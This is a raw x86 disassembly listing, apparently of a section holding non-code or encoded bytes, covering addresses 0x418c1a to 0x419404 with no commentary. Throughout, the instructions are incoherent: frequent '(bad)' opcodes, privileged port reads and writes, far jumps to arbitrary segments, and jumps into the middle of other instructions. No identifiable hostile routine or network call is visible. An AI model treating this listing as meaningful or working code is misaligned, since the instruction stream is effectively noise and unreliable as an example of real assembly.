  418c1a:	mov    ah,0x87
  418c1c:	jae    0x418c45
  418c1e:	enter  0x2b0f,0xa4
  418c22:	xchg   edx,eax
  418c23:	ds icebp 
  418c25:	mov    dl,0x2d
  418c27:	xor    DWORD PTR [eax+0xb10a451],ecx
  418c2d:	push   ebp
  418c2e:	dec    ecx
  418c2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c30:	mov    ch,BYTE PTR [esp+ebx*2+0x13]
  418c34:	inc    esi
  418c35:	add    al,0xa8
  418c37:	div    esp
  418c39:	stos   BYTE PTR es:[edi],al
  418c3a:	(bad)  
  418c3b:	jecxz  0x418c8b
  418c3d:	test   al,0x54
  418c3f:	xor    DWORD PTR [edi-0x33dd4262],0x1d
  418c46:	cld    
  418c47:	adc    esi,ecx
  418c49:	dec    esp
  418c4a:	imul   edx,DWORD PTR [esi+0x60],0x61b52790
  418c51:	in     al,0x29
  418c53:	leave  
  418c54:	cmc    
  418c55:	iret   
  418c56:	xor    DWORD PTR [ecx+eax*4-0x3a],0x86a72b0b
  418c5e:	cdq    
  418c5f:	mov    ebp,0xd816a397
  418c64:	out    dx,al
  418c65:	fistp  DWORD PTR [ecx+0x10]
  418c68:	cmp    eax,0x72a8a360
  418c6d:	(bad)  
  418c6e:	inc    esp
  418c6f:	cmc    
  418c70:	das    
  418c71:	popa   
  418c72:	add    BYTE PTR [edx],bh
  418c74:	daa    
  418c75:	mov    dl,0x46
  418c77:	mov    ecx,0x50288438
  418c7c:	into   
  418c7d:	mov    ecx,0x4fedcf72
  418c82:	add    DWORD PTR [ecx],esp
  418c84:	es scas al,BYTE PTR es:[edi]
  418c86:	fdivr  QWORD PTR [ebx+0x578c5824]
  418c8c:	cld    
  418c8d:	or     al,0x10
  418c8f:	or     al,0x53
  418c91:	xchg   ebp,eax
  418c92:	xchg   ebp,eax
  418c93:	xor    esp,DWORD PTR [ebx+0x2a4e9576]
  418c99:	push   ebp
  418c9a:	aas    
  418c9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c9c:	push   es
  418c9d:	and    bl,0x3d
  418ca0:	mov    DWORD PTR [ebx-0x36],eax
  418ca3:	fist   DWORD PTR [ebp-0x11]
  418ca6:	gs (bad) 
  418ca8:	pop    esp
  418ca9:	xchg   esp,eax
  418caa:	mov    dh,0xef
  418cac:	add    eax,0x1ffd87a7
  418cb1:	mov    cl,0x9a
  418cb3:	in     al,0x7
  418cb5:	pop    es
  418cb6:	sbb    DWORD PTR [edi],edx
  418cb8:	or     ebp,edx
  418cba:	mov    al,ds:0x4ef19c4f
  418cbf:	or     eax,0x84ea7667
  418cc4:	stos   DWORD PTR es:[edi],eax
  418cc5:	retf   0xd82d
  418cc8:	push   ss
  418cc9:	loope  0x418d01
  418ccb:	or     BYTE PTR [ebx-0x741cfaac],al
  418cd1:	mov    al,0x62
  418cd3:	sbb    dh,dl
  418cd5:	jmp    0x418c5e
  418cd7:	nop
  418cd8:	lahf   
  418cd9:	pop    edi
  418cda:	jle    0x418c70
  418cdc:	in     eax,0x3
  418cde:	aaa    
  418cdf:	xor    ebx,eax
  418ce1:	ja     0x418ce3
  418ce3:	add    DWORD PTR [edx-0x7397337d],eax
  418ce9:	leave  
  418cea:	aam    0xe3
  418cec:	or     bh,BYTE PTR [eax]
  418cee:	sub    DWORD PTR [eax+edx*8+0x34],edx
  418cf2:	fwait
  418cf3:	(bad)  
  418cf4:	jmp    0x418d3e
  418cf6:	sbb    bl,BYTE PTR [ebx+0x2e]
  418cf9:	or     al,0xbc
  418cfb:	les    ecx,FWORD PTR [edx-0x754fa83a]
  418d01:	sub    al,0xc1
  418d03:	add    al,0x5d
  418d05:	dec    edx
  418d06:	dec    edi
  418d07:	sbb    esi,DWORD PTR [ebp-0x71]
  418d0a:	pop    eax
  418d0b:	cmp    dh,BYTE PTR ds:0xb2f41898
  418d11:	xor    bh,BYTE PTR [eax]
  418d13:	mov    bl,0x92
  418d15:	loopne 0x418cd3
  418d17:	in     eax,dx
  418d18:	sub    DWORD PTR [ecx],ebx
  418d1a:	mov    ch,0x35
  418d1c:	shr    DWORD PTR [esi-0x135dcc9b],1
  418d22:	stos   BYTE PTR es:[edi],al
  418d23:	test   eax,0x5dac67ea
  418d28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d29:	xchg   edi,eax
  418d2a:	xchg   ebx,eax
  418d2b:	add    ebp,edi
  418d2d:	aad    0x55
  418d2f:	mov    dl,0xa
  418d31:	imul   esp,DWORD PTR ds:0x45505f61,0x3d
  418d38:	mov    dh,0xb2
  418d3a:	iret   
  418d3b:	xchg   BYTE PTR [ebx-0x60],bl
  418d3e:	neg    DWORD PTR ds:0x4243f8fc
  418d44:	in     al,0xd7
  418d46:	push   ds
  418d47:	popa   
  418d48:	add    ebp,DWORD PTR [esp+edi*8]
  418d4b:	cmp    eax,0x165aab2
  418d50:	push   ebx
  418d51:	dec    edi
  418d52:	or     DWORD PTR [ecx],0xa8871a68
  418d58:	in     al,0x22
  418d5a:	popa   
  418d5b:	ret    
  418d5c:	scas   al,BYTE PTR es:[edi]
  418d5d:	inc    eax
  418d5e:	out    0x93,al
  418d60:	push   0x72
  418d62:	retf   
  418d63:	xchg   edx,eax
  418d64:	xchg   BYTE PTR [edx-0x58],bh
  418d67:	in     eax,dx
  418d68:	dec    ecx
  418d69:	neg    BYTE PTR [edx+ebx*1-0x22]
  418d6d:	outs   dx,DWORD PTR ds:[esi]
  418d6e:	aas    
  418d6f:	sbb    edi,ebp
  418d71:	dec    eax
  418d72:	jmp    0xb5e:0xe2ebb329
  418d79:	dec    eax
  418d7a:	jae    0x418dc1
  418d7c:	cmc    
  418d7d:	jno    0x418d04
  418d7f:	ins    DWORD PTR es:[edi],dx
  418d80:	daa    
  418d81:	aam    0x73
  418d83:	cwde   
  418d84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d85:	rcl    BYTE PTR [edx+0x1e1f4b7d],1
  418d8b:	dec    eax
  418d8c:	and    eax,DWORD PTR [ecx]
  418d8e:	mov    ?,WORD PTR [edx-0x2cc2329b]
  418d94:	imul   ecx,ebp,0x52
  418d97:	xor    eax,0x58129f50
  418d9c:	jmp    0x2593f87d
  418da1:	push   0x42
  418da3:	jo     0x418d7f
  418da5:	out    dx,al
  418da6:	jl     0x418e05
  418da8:	sti    
  418da9:	mov    ebx,0xdc570b43
  418dae:	lahf   
  418daf:	sub    ah,BYTE PTR [ebx]
  418db1:	into   
  418db2:	push   0xffffffcd
  418db4:	aas    
  418db5:	jbe    0x418dce
  418db7:	int    0x64
  418db9:	xlat   BYTE PTR ds:[ebx]
  418dba:	fstp   TBYTE PTR [ebp+0x76221132]
  418dc0:	lock sbb BYTE PTR [ebx],cl
  418dc3:	pop    edi
  418dc4:	js     0x418e2d
  418dc6:	test   DWORD PTR ds:0xffeeea62,esi
  418dcc:	fnsave [edi]
  418dce:	(bad)  
  418dcf:	iret   
  418dd0:	push   eax
  418dd1:	or     bh,BYTE PTR [edi-0xcd21598]
  418dd7:	pop    eax
  418dd8:	mov    ch,0x29
  418dda:	retf   0xfba1
  418ddd:	iret   
  418dde:	mov    ds:0xb8e16bed,al
  418de3:	pop    esi
  418de4:	xlat   BYTE PTR gs:[ebx]
  418de6:	or     bl,bh
  418de8:	mov    edi,0xb76bdf01
  418ded:	mov    al,ds:0xb66dabe6
  418df2:	or     cl,BYTE PTR [edi+ecx*8+0x5dfe1ef3]
  418df9:	dec    ebx
  418dfa:	aaa    
  418dfb:	aaa    
  418dfc:	neg    BYTE PTR ds:0xb1d00f33
  418e02:	ins    DWORD PTR es:[edi],dx
  418e03:	or     ebp,DWORD PTR ss:[ebx+ebx*2+0x46]
  418e08:	and    eax,0xef8f2cb1
  418e0d:	repz imul edi,DWORD PTR [esi+ebx*2-0x3321cf0a],0x71
  418e16:	mov    ecx,0x9bf3b194
  418e1b:	jg     0x418dc0
  418e1d:	mov    edi,0x205bfdeb
  418e22:	sbb    ah,bh
  418e24:	out    0x6b,eax
  418e26:	ins    DWORD PTR es:[edi],dx
  418e27:	cld    
  418e28:	out    dx,al
  418e29:	sub    BYTE PTR [esi-0x59],bl
  418e2c:	(bad)  [edx-0x71]
  418e2f:	mov    ah,0x8
  418e31:	dec    eax
  418e32:	outs   dx,BYTE PTR ds:[esi]
  418e33:	int    0xc4
  418e35:	pop    es
  418e36:	stos   DWORD PTR es:[edi],eax
  418e37:	jecxz  0x418dd6
  418e39:	dec    eax
  418e3a:	(bad)  
  418e3b:	cmp    ah,BYTE PTR [ebx-0x5a687ee]
  418e41:	(bad)  
  418e42:	dec    edx
  418e43:	outs   dx,DWORD PTR ds:[esi]
  418e44:	mov    edi,0x3e70dddf
  418e49:	xchg   ebp,eax
  418e4a:	outs   dx,DWORD PTR ds:[esi]
  418e4b:	fwait
  418e4c:	and    al,0xdd
  418e4e:	adc    eax,0x5b99ed73
  418e53:	inc    ebx
  418e54:	(bad)  
  418e55:	rol    DWORD PTR [edi+0x35],1
  418e58:	aas    
  418e59:	jle    0x418dfe
  418e5b:	xchg   BYTE PTR ds:0xfb059323,bh
  418e61:	test   eax,0xf1126840
  418e66:	clc    
  418e67:	mov    ebp,0xbac76dee
  418e6c:	cdq    
  418e6d:	sti    
  418e6e:	push   esp
  418e6f:	sbb    dl,BYTE PTR [eax]
  418e71:	and    esp,DWORD PTR [ebp-0x2d0cb781]
  418e77:	int3   
  418e78:	rcl    bh,0x70
  418e7b:	retf   
  418e7c:	and    edx,ebp
  418e7e:	popa   
  418e7f:	mov    ch,0xe9
  418e81:	adc    BYTE PTR [edi],al
  418e83:	cld    
  418e84:	push   ss
  418e85:	daa    
  418e86:	mov    edi,0xd2c9522d
  418e8b:	mov    esi,0x3d9322e0
  418e90:	shl    BYTE PTR [edx],cl
  418e92:	mov    ebp,0xe4f4a804
  418e97:	sub    dl,dl
  418e99:	out    0x83,al
  418e9b:	push   0x3
  418e9d:	mov    al,ds:0x483493d9
  418ea2:	xor    DWORD PTR [ebx],ebp
  418ea4:	sti    
  418ea5:	and    edi,edi
  418ea7:	aas    
  418ea8:	cmp    al,0x93
  418eaa:	enter  0xbe92,0x65
  418eae:	cmp    esi,DWORD PTR [edx]
  418eb0:	push   eax
  418eb1:	lods   al,BYTE PTR ds:[esi]
  418eb2:	xor    DWORD PTR [ebx],ebx
  418eb4:	mov    BYTE PTR [edi+0x3],bl
  418eb7:	jmp    0x7824:0x484e094f
  418ebe:	(bad)  
  418ebf:	cld    
  418ec0:	bound  ebx,QWORD PTR [edx]
  418ec2:	aam    0x1a
  418ec4:	bsr    edi,DWORD PTR [ecx+0x78f60bad]
  418ecb:	leave  
  418ecc:	js     0x418ed4
  418ece:	jae    0x418eb9
  418ed0:	xchg   ecx,eax
  418ed1:	and    ebx,edx
  418ed3:	lock fwait
  418ed5:	add    DWORD PTR fs:[eax],ebp
  418ed8:	cmp    edx,DWORD PTR [edx-0x41916ddb]
  418ede:	adc    eax,0x742f6694
  418ee3:	aaa    
  418ee4:	mov    eax,0x7c865459
  418ee9:	mov    BYTE PTR [ecx+0x64],dh
  418eec:	loop   0x418e74
  418eee:	push   0xf8191cda
  418ef3:	push   edx
  418ef4:	stos   BYTE PTR es:[edi],al
  418ef5:	and    al,0x93
  418ef7:	xor    eax,0x111d2c4
  418efc:	imul   esp,DWORD PTR [ecx+0x2e6787d9],0x27
  418f03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f04:	rol    DWORD PTR [edx-0x48],1
  418f07:	daa    
  418f08:	sbb    al,0xdf
  418f0a:	xor    DWORD PTR [ebx+ecx*8+0x4e],ecx
  418f0e:	fmul   st,st(5)
  418f10:	push   ebp
  418f11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f12:	add    DWORD PTR [edi],eax
  418f14:	aad    0x47
  418f16:	aas    
  418f17:	add    bl,dl
  418f19:	pop    ecx
  418f1a:	hlt    
  418f1b:	push   cs
  418f1c:	and    esp,DWORD PTR [edi]
  418f1e:	xchg   DWORD PTR [ecx-0x3f],esp
  418f21:	add    cl,BYTE PTR [ebx]
  418f23:	addr16 inc ecx
  418f25:	out    0x94,eax
  418f27:	sbb    edx,esp
  418f29:	xchg   esi,eax
  418f2a:	into   
  418f2b:	jnp    0x418f55
  418f2d:	adc    eax,0x75e9d0ac
  418f32:	dec    edi
  418f33:	xchg   ecx,eax
  418f34:	dec    edi
  418f35:	ins    BYTE PTR es:[edi],dx
  418f36:	inc    esp
  418f37:	jb     0x418f17
  418f39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f3b:	fadd   DWORD PTR [edi+0x61]
  418f3e:	sub    al,ch
  418f40:	mov    dl,0x6
  418f42:	add    eax,0xbced3ef9
  418f47:	clc    
  418f48:	in     al,0x2b
  418f4a:	cmp    eax,0x2f2afcb1
  418f4f:	retf   
  418f50:	sbb    BYTE PTR [edx+0x59],al
  418f53:	cmc    
  418f54:	dec    ecx
  418f55:	mov    eax,0x59484509
  418f5a:	rcr    DWORD PTR [edi],0x8d
  418f5d:	mov    bh,0x8
  418f5f:	mov    al,0x6b
  418f61:	test   al,0xe
  418f63:	mov    ch,0xc4
  418f65:	jmp    0xb7f1:0xd72a0f88
  418f6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f6d:	push   esi
  418f6e:	dec    DWORD PTR [edi-0x22]
  418f71:	adc    ebx,0x892ad1
  418f77:	dec    ecx
  418f78:	push   eax
  418f79:	jns    0x418f4a
  418f7b:	push   0x49f44489
  418f80:	xor    BYTE PTR [esi],dl
  418f82:	adc    edi,DWORD PTR [eax+0x45712907]
  418f88:	leave  
  418f89:	test   ecx,eax
  418f8b:	add    ebx,ebp
  418f8d:	push   edx
  418f8e:	jmp    0xff6b875e
  418f93:	mov    edi,0x436a73be
  418f98:	fild   WORD PTR ds:0x359d0519
  418f9e:	add    dl,BYTE PTR [ecx+0x10]
  418fa1:	stc    
  418fa2:	mov    ch,0xe8
  418fa4:	lods   eax,DWORD PTR ds:[esi]
  418fa5:	sar    BYTE PTR [edi-0x44b28ac3],cl
  418fab:	idiv   dh
  418fad:	jno    0x418fd6
  418faf:	xor    ecx,ecx
  418fb1:	adc    eax,0x105938dd
  418fb6:	pop    es
  418fb7:	aas    
  418fb8:	inc    esp
  418fb9:	rcl    DWORD PTR [eax],cl
  418fbb:	mov    edx,0x8cad0a28
  418fc0:	nop
  418fc1:	fnstenv ds:0xee4da7b5
  418fc7:	jge    0x418fee
  418fc9:	push   0xffffffa0
  418fcb:	clc    
  418fcc:	fcomip st,st(0)
  418fce:	add    ch,al
  418fd0:	mov    al,0x94
  418fd2:	mov    bl,BYTE PTR [eax-0x6d]
  418fd5:	cmp    eax,0x756003cc
  418fda:	out    0x31,eax
  418fdc:	loopne 0x418fc3
  418fde:	mov    dl,0xbf
  418fe0:	fidivr WORD PTR [ebx]
  418fe2:	mov    ebp,0xc6db5794
  418fe7:	add    BYTE PTR [ebx],0x85
  418fea:	xchg   ebx,eax
  418feb:	mov    ebx,0x115f858a
  418ff0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ff1:	je     0x41902d
  418ff3:	jecxz  0x418fd2
  418ff5:	pop    ebp
  418ff7:	dec    esi
  418ff8:	les    ebp,FWORD PTR [edi+ebp*1-0x25]
  418ffc:	pushf  
  418ffd:	mov    ch,0xc0
  418fff:	gs jmp 0xfe10:0xc048ffac
  419007:	xchg   edx,eax
  419008:	mov    edi,0xa052960a
  41900d:	not    DWORD PTR [ebx+0x38]
  419010:	loopne 0x418ff1
  419012:	mov    al,ds:0x8ac59feb
  419017:	mov    dh,0x6e
  419019:	adc    al,0x19
  41901b:	cmp    ah,BYTE PTR cs:[eax-0x4785aca9]
  419022:	jb     0x4190a3
  419024:	addr16 ret 0x683c
  419028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419029:	or     DWORD PTR [edx-0x23206337],ebp
  41902f:	enter  0x8ec1,0xca
  419033:	jl     0x419072
  419035:	mov    bh,BYTE PTR ds:0x1a5009b2
  41903b:	cmp    eax,0xcc8c05d3
  419040:	pop    ds
  419041:	pop    edx
  419042:	mov    ecx,0xa3404793
  419047:	clc    
  419048:	sub    DWORD PTR [ebp+0x6b],eax
  41904b:	ror    DWORD PTR [edx+0x4643ed0],cl
  419051:	jae    0x4190bd
  419053:	inc    esp
  419054:	add    al,0x1a
  419056:	clc    
  419057:	sahf   
  419058:	cmp    al,bl
  41905a:	push   ss
  41905b:	cmc    
  41905c:	pusha  
  41905d:	push   eax
  41905e:	pop    ecx
  41905f:	jae    0x419091
  419061:	mov    ch,0x52
  419063:	lock adc DWORD PTR [eax],esp
  419066:	repz push ecx
  419068:	jecxz  0x419071
  41906a:	push   cs
  41906b:	mov    eax,ds:0x4e9dd7fd
  419070:	lahf   
  419071:	cs push edx
  419073:	add    al,0xda
  419075:	inc    esp
  419076:	and    BYTE PTR [eax+0x701bbbec],al
  41907c:	or     BYTE PTR [ebx-0x4b],ch
  41907f:	inc    ecx
  419080:	inc    esi
  419081:	push   esp
  419082:	sbb    BYTE PTR [ebp-0x6634b3a8],ch
  419088:	add    eax,0x8e46b51c
  41908d:	jecxz  0x41907f
  41908f:	inc    eax
  419090:	not    BYTE PTR [eax+0x24a8669]
  419096:	int    0xe8
  419098:	and    al,0xdc
  41909a:	call   0x5aa7a939
  41909f:	pushf  
  4190a0:	hlt    
  4190a1:	pusha  
  4190a2:	mov    ch,0xd1
  4190a4:	push   es
  4190a5:	mov    ds:0x1781c928,eax
  4190aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190ab:	adc    DWORD PTR [edx],edi
  4190ad:	jno    0x419100
  4190af:	xchg   esi,eax
  4190b0:	or     cl,BYTE PTR cs:[ebx-0x52]
  4190b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190b5:	pop    edx
  4190b6:	push   ecx
  4190b7:	cmp    ah,BYTE PTR [ebp-0x68984d5f]
  4190bd:	stc    
  4190be:	ret    0xc666
  4190c1:	cmp    DWORD PTR [ebx+ebx*2-0x45],eax
  4190c5:	sbb    eax,0x4d4fca30
  4190ca:	cmp    al,0x76
  4190cc:	push   ebp
  4190cd:	pusha  
  4190ce:	adc    al,0xc9
  4190d0:	push   ss
  4190d1:	jmp    0x41911c
  4190d3:	cmp    DWORD PTR [ebp+eiz*4+0x32],ecx
  4190d7:	es je  0x41905b
  4190da:	ret    0xa0ae
  4190dd:	mov    esi,0x810f912a
  4190e2:	lea    edi,ds:0x533cc896
  4190e8:	iret   
  4190e9:	dec    eax
  4190ea:	mov    ebp,0x2798b679
  4190f0:	lock push eax
  4190f2:	adc    BYTE PTR [esi+esi*8+0xb371dd1],0x10
  4190fa:	bound  ebx,QWORD PTR [edx]
  4190fc:	fwait
  4190fd:	ja     0x419144
  4190ff:	fistp  QWORD PTR ds:0x15590738
  419105:	inc    ebp
  419106:	fwait
  419107:	jae    0x419162
  419109:	mov    bh,cl
  41910b:	pop    ecx
  41910c:	cs enter 0x7e7e,0xb9
  419111:	pop    ebx
  419112:	mov    ds:0x6f6c1112,eax
  419117:	jl     0x419135
  419119:	out    dx,al
  41911a:	jne    0x4190b2
  41911c:	mov    ah,0xd0
  41911e:	pop    ss
  41911f:	push   es
  419120:	pcmpeqd mm7,QWORD PTR [esi]
  419123:	add    BYTE PTR [edi-0x46f9f1a],dh
  419129:	js     0x4190f2
  41912b:	inc    eax
  41912c:	cmp    bh,BYTE PTR [ecx+eax*2-0x2e36dd11]
  419133:	mov    bh,0x22
  419135:	mov    esp,0x17378dca
  41913a:	cmc    
  41913b:	loopne 0x4190e3
  41913d:	pop    ss
  41913e:	sbb    BYTE PTR [ebx-0x59b8622e],dh
  419144:	(bad)  
  419145:	mov    ecx,0x89e8cd91
  41914a:	add    dl,cl
  41914c:	xchg   ecx,eax
  41914d:	mov    esi,DWORD PTR [eax-0xca45b53]
  419153:	repnz div eax
  419156:	add    DWORD PTR [esi+0x3e429ca8],eax
  41915c:	ret    0x5959
  41915f:	mov    cl,0xbe
  419161:	or     cl,0x20
  419164:	sbb    ecx,0xffffffdd
  419167:	mov    ds:0x56d8d50b,al
  41916c:	imul   ecx,DWORD PTR [esi+eax*8],0xffffffa3
  419170:	(bad)
  419174:	adc    ebx,DWORD PTR [esi]
  419176:	dec    ebx
  419177:	sbb    DWORD PTR [eax+0x33],edx
  41917a:	mov    ds:0x4bc72609,eax
  41917f:	retf   0xc067
  419182:	mov    dh,BYTE PTR [esp+eax*4]
  419185:	test   DWORD PTR [esi],esp
  419187:	rcl    esp,0x9d
  41918a:	cmp    BYTE PTR [edx-0x58ec835],bh
  419190:	cmp    DWORD PTR [ebx+esi*1-0x50022cdb],ebp
  419197:	or     DWORD PTR [ebx-0x5],ecx
  41919a:	add    BYTE PTR [ebp+0x41],bh
  41919d:	mov    ch,0x5f
  41919f:	test   al,0x8a
  4191a1:	out    dx,eax
  4191a2:	mov    eax,DWORD PTR [eax+edi*2]
  4191a5:	push   esi
  4191a6:	xor    DWORD PTR [ecx-0x19],eax
  4191a9:	rcl    BYTE PTR [bp+di-0x5872],1
  4191ae:	ss pop ebp
  4191b0:	aaa    
  4191b1:	es aad 0xc2
  4191b4:	lds    ebp,FWORD PTR ss:[ebp-0x23983750]
  4191bb:	scas   al,BYTE PTR es:[edi]
  4191bc:	or     eax,0x3c6797fb
  4191c1:	xor    dl,bl
  4191c3:	inc    ecx
  4191c4:	icebp  
  4191c5:	xor    eax,0xc3af40dc
  4191ca:	lods   eax,DWORD PTR ds:[esi]
  4191cb:	jmp    0xe732:0xae91959a
  4191d2:	out    0xb2,eax
  4191d4:	das    
  4191d5:	mov    al,ds:0x5e1e3575
  4191da:	fild   QWORD PTR [edi-0x9]
  4191dd:	aam    0xec
  4191df:	lods   eax,DWORD PTR ds:[esi]
  4191e0:	push   ebx
  4191e1:	imul   DWORD PTR [esi+0x3c5c7ce7]
  4191e7:	add    DWORD PTR ds:0xcf2914d6,0x2a
  4191ee:	lds    ebp,FWORD PTR [eax+0x35a7fe64]
  4191f4:	call   0xc47a:0xae486316
  4191fb:	jns    0x41921b
  4191fd:	mov    al,0xa7
  4191ff:	retf   
  419200:	call   0xe187:0x62bbce8c
  419207:	jns    0x41926e
  419209:	xchg   esp,eax
  41920a:	data16 scas al,BYTE PTR es:[di]
  41920d:	jmp    0x419277
  41920f:	jle    0x419279
  419211:	dec    edi
  419212:	push   ebx
  419213:	mov    ds:0x361fa41f,eax
  419218:	jp     0x4191e8
  41921a:	inc    esp
  41921b:	jmp    0xa4c28e16
  419220:	xchg   BYTE PTR [eax-0x642241b5],cl
  419226:	mov    esp,DWORD PTR [eax-0x6f822376]
  41922c:	inc    ecx
  41922d:	xchg   edi,eax
  41922e:	sub    eax,0xaab2fb30
  419233:	std    
  419234:	daa    
  419235:	jne    0x419223
  419237:	cmp    ah,BYTE PTR [ecx-0x70]
  41923a:	xchg   ebp,eax
  41923b:	adc    ecx,ebx
  41923d:	sub    BYTE PTR [ebx],0xe4
  419240:	imul   ecx,edx,0xa1a1ac76
  419246:	fdivrp st(3),st
  419248:	mov    dl,0xc3
  41924a:	dec    esp
  41924b:	scas   al,BYTE PTR es:[edi]
  41924c:	test   eax,0x5626ebb2
  419251:	add    ecx,DWORD PTR [ebx-0xc]
  419254:	imul   edi,DWORD PTR [eax-0x6f],0x529f996a
  41925b:	cmc    
  41925c:	pusha  
  41925d:	mov    bl,0x51
  41925f:	repz push edx
  419261:	jno    0x419231
  419263:	sbb    BYTE PTR [edx],dh
  419265:	push   cs
  419266:	std    
  419267:	sbb    DWORD PTR [ecx-0x5a8fa993],ebx
  41926d:	mov    eax,0xdb59276
  419272:	pop    eax
  419273:	adc    BYTE PTR [edx],0xe2
  419276:	mov    cl,0xbb
  419278:	js     0x419285
  41927a:	and    DWORD PTR [eax],ecx
  41927c:	adc    edi,DWORD PTR [ecx+0x570c0f8b]
  419282:	stos   DWORD PTR es:[edi],eax
  419283:	inc    edx
  419284:	stos   BYTE PTR es:[edi],al
  419285:	lea    eax,[edx-0x15]
  419288:	pop    edx
  419289:	mov    al,ds:0x18e19d4
  41928e:	adc    eax,0xa752d968
  419293:	fild   DWORD PTR [edi+0x30c22533]
  419299:	push   ecx
  41929a:	xor    eax,0xf25a6549
  41929f:	inc    ebp
  4192a0:	out    dx,eax
  4192a1:	and    BYTE PTR ds:0xc6ece92,dh
  4192a7:	fst    QWORD PTR [edx-0x2f4b0c13]
  4192ad:	sub    DWORD PTR [ecx],ebx
  4192af:	std    
  4192b0:	pop    ecx
  4192b1:	mov    edi,0xf419611e
  4192b6:	push   0x61
  4192b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192b9:	inc    esi
  4192ba:	mov    ebx,DWORD PTR [edx]
  4192bc:	(bad)  
  4192bd:	mov    eax,ds:0x7391fcff
  4192c2:	loope  0x4192ae
  4192c4:	pop    es
  4192c5:	clc    
  4192c6:	jp     0x4192bd
  4192c8:	or     al,0x51
  4192ca:	test   al,0xcc
  4192cc:	or     ecx,0xe
  4192cf:	cmp    ah,BYTE PTR [edx]
  4192d1:	adc    al,0x79
  4192d4:	cmp    eax,0x5d83af33
  4192d9:	mov    eax,ds:0x8ac53959
  4192de:	icebp  
  4192df:	adc    dl,ah
  4192e1:	jne    0x419352
  4192e3:	push   ecx
  4192e4:	js     0x41933d
  4192e6:	cmp    al,0x1b
  4192e8:	aaa    
  4192e9:	jns    0x4192e8
  4192eb:	mov    ah,0x74
  4192ed:	xchg   edx,eax
  4192ee:	and    BYTE PTR [esi+edi*4],ch
  4192f1:	loope  0x419285
  4192f3:	nop
  4192f4:	dec    ecx
  4192f5:	sub    ch,BYTE PTR [esi]
  4192f7:	mov    ds:0xe5796390,al
  4192fc:	scas   eax,DWORD PTR es:[edi]
  4192fd:	call   0x10a5:0x7dcc57fe
  419304:	jbe    0x41930f
  419306:	ja     0x419386
  419308:	jg     0x41932c
  41930a:	xchg   ebp,eax
  41930b:	inc    dx
  41930d:	or     DWORD PTR [ebx-0x9],esi
  419310:	pop    esi
  419311:	xor    DWORD PTR [ecx],esi
  419313:	data16 mov bl,0x95
  419316:	mov    WORD PTR [esi+esi*1],gs
  419319:	dec    edi
  41931a:	push   ds
  41931b:	jnp    0x4192a8
  41931d:	or     BYTE PTR [esi+0x0],bh
  419320:	inc    edx
  419321:	es mov bh,0x34
  419324:	out    0xef,eax
  419326:	loop   0x4192ee
  419328:	add    cl,ch
  41932a:	jb     0x41938f
  41932c:	add    al,0x70
  41932e:	retf   
  41932f:	add    BYTE PTR [ebx+0x34],dh
  419332:	neg    DWORD PTR [edi-0x59400054]
  419338:	mov    es,WORD PTR [esp+esi*2+0x4a394cdd]
  41933f:	repnz out 0x55,al
  419342:	dec    ecx
  419343:	or     bh,bl
  419345:	fisttp DWORD PTR [edi+0x20]
  419348:	add    DWORD PTR ds:0x49149722,eax
  41934e:	fnsave [edi+0x2f48d7ac]
  419354:	cmp    eax,0x8a884434
  419359:	fisttp WORD PTR [ecx-0x1b0395bb]
  41935f:	bound  edx,QWORD PTR [ebp+eax*8+0x44]
  419363:	loop   0x4192ec
  419365:	and    BYTE PTR [eax-0x2a],bl
  419368:	fcomp  QWORD PTR [ecx-0x73c8e2d9]
  41936e:	sbb    eax,0x88265fec
  419373:	push   eax
  419374:	out    dx,al
  419375:	inc    esp
  419376:	mov    eax,0x49975cc2
  41937b:	mov    ah,0x4e
  41937d:	aaa    
  41937e:	sbb    ch,ch
  419380:	xor    DWORD PTR [eax-0x75],0xffffffbc
  419384:	or     bh,BYTE PTR [esi]
  419386:	ja     0x4193ef
  419388:	out    dx,al
  419389:	dec    eax
  41938a:	repz sub BYTE PTR [edx-0x2a],bh
  41938e:	dec    esp
  41938f:	imul   edx,DWORD PTR [esi+0x75],0xa2607ed8
  419396:	jmp    0xe1ac:0x6162272e
  41939d:	fwait
  41939e:	dec    ecx
  41939f:	(bad)  
  4193a0:	jmp    0x7848:0x80782417
  4193a7:	and    al,0x84
  4193a9:	sbb    ebx,DWORD PTR [esi+0x72ec1727]
  4193af:	iret   
  4193b0:	es pop es
  4193b2:	js     0x41936b
  4193b4:	loopne 0x41938f
  4193b6:	lds    ebx,FWORD PTR [esi-0x1e]
  4193b9:	shl    DWORD PTR [ebp-0x74],0x87
  4193bd:	pop    ecx
  4193be:	adc    esi,DWORD PTR [ebx-0x543e8158]
  4193c4:	fcom   QWORD PTR [edx]
  4193c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193c7:	xchg   ebx,eax
  4193c8:	int3   
  4193c9:	aad    0x75
  4193cb:	mov    bh,0xeb
  4193cd:	jp     0x4193ab
  4193cf:	pop    edx
  4193d0:	mov    edx,0xc83027d5
  4193d5:	mov    ebp,0x3587e4a
  4193da:	gs mov eax,0x4785e193
  4193e0:	fs in  al,dx
  4193e2:	outs   dx,DWORD PTR ds:[esi]
  4193e3:	icebp  
  4193e4:	xchg   esp,eax
  4193e5:	gs xchg ebp,eax
  4193e7:	fs inc ecx
  4193e9:	fdivr  st,st(3)
  4193eb:	mov    ds:0xe6798d08,al
  4193f0:	pop    edi
  4193f1:	jno    0x4193f5
  4193f3:	dec    ebx
  4193f4:	xor    esi,DWORD PTR [ebx-0x5c]
  4193f7:	pop    esp
  4193f8:	mov    ch,0x85
  4193fa:	lods   eax,DWORD PTR ds:[esi]
  4193fb:	(bad)  
  4193fd:	jg     0x419383
  4193ff:	mov    al,ds:0xd048597a
  419404:	in     eax,dx
